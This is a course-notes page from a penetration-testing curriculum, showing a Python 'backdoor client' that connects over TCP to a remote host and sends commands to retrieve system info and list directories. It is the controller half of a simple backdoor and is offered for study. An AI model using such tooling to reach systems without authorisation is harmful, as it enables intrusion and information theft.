---
description: Backdoor Client from Python section of PTSv4 (eLearnSecurity)
---

# BackdoorClient.py

```python
import socket

SRV_ADDR = input("Server's IP: ")
SRV_PORT = int(input("TCP port to connect to: "))

# Creates print_menu function and outputs the different options

def print_menu():
    print("""\n\n0) Close the connection
1) Get system info
2) List directory contents""")

# Creates socket that the client will use, defines it as TCP IPv4

my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
my_sock.connect((SRV_ADDR, SRV_PORT))

# Confirms once

print("Connection established")
print_menu()

while 1:
    message = input("\n-Select an option: ")

    if(message == "0"):
        my_sock.sendall(message.encode())
        my_sock.close()
        break
    elif(message == "1"):
        my_sock.sendall(message.encode())
        data = my_sock.recv(1024)
        if not data: break
        print(data.decode('utf-8'))
    elif(message == "2"):
        path = input("insert the path: ")
        my_sock.sendall(message.encode())
        my_sock.send(path.encode())
        data = my_sock.recv(1024)
        data = data.decode('utf-8').split(",")
        print("*" * 40)
        for x in data:
            print(x)
        print("*" * 40)
    print_menu()
```

